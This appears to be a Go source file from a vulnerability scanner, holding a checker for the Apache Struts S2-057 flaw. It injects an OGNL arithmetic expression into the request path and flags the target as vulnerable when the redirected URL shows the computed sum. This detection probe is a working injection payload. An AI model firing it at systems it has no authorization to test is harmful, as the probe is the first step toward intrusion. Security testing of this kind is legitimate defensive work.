package struts

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"

	"project/internal/logger"
	"project/internal/random"
)

type st2057 struct {
}

func newSt2057() *st2057 {
	return nil
}

func (st2057) Check(client *http.Client, lg logger.Logger, address, uri, action, ua string) (bool, error) {
	randNum1 := 1000000 + random.Int(1000000)
	randNum2 := 1000000 + random.Int(1000000)
	payload := fmt.Sprintf("${(%d+%d)}", randNum1, randNum2)
	url := fmt.Sprintf("http://%s%s%s/%s", address, uri, payload, action)
	lg.Println(logger.Info, "", "url:", url)
	// build request
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return false, err
	}
	header := req.Header
	header.Set("User-Agent", ua)
	// send request
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer client.CloseIdleConnections()
	defer func() { _ = resp.Body.Close() }()
	_, err = io.Copy(ioutil.Discard, resp.Body)
	if err != nil {
		return false, err
	}
	url = resp.Request.URL.String()
	lg.Println(logger.Info, "", "redirected url:", url)
	num := strconv.Itoa(randNum1 + randNum2)
	return strings.Contains(url, num), nil
}
